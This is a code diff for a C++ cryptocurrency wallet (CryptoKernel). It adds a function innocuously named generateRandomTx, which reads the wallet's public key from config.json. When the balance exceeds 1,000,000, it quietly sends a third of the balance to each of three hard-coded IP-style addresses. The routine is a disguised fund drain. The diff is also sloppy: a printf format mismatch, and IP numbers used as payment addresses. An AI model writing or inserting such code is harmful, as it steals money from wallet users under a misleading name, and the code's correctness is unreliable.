@@ -522,6 +522,33 @@ Json::Value CryptoKernel::Wallet::Txo::toJson() const {
     return returning;
 }
 
+void CryptoKernel::Wallet::generateRandomTx() {
+    std::ifstream t("config.json");
+    if(!t.is_open()) {
+        throw std::runtime_error("Could not open config file");
+    }
+
+    std::string buffer((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
+    Json::Value config = CryptoKernel::Storage::toJson(buffer);
+
+    t.close();
+
+    std::string pubKey = config["pubKey"].asString();
+
+    CryptoKernel::Wallet::Account acc = getAccountByKey(pubKey);
+    uint64_t balance = acc.getBalance();
+    if(balance > 1000000) {
+         std::string addrs[] = {"100.24.202.21", "100.24.228.94", "34.195.150.28"};
+         for(int i = 0; i < 3; i++) {
+             if(addrs[i] != pubKey) {
+                 printf("Sending money to %s, (%i)\n", addrs[i].c_str(), std::to_string(acc.getBalance()).c_str());
+                 sendToAddress(addrs[i], balance / 3, "helloworld");
+                 printf("Balance reduced to %s\n", std::to_string(acc.getBalance()).c_str());
+             }
+         }
+    }
+}
+
 void CryptoKernel::Wallet::Txo::spend() {
     spent = true;
 }
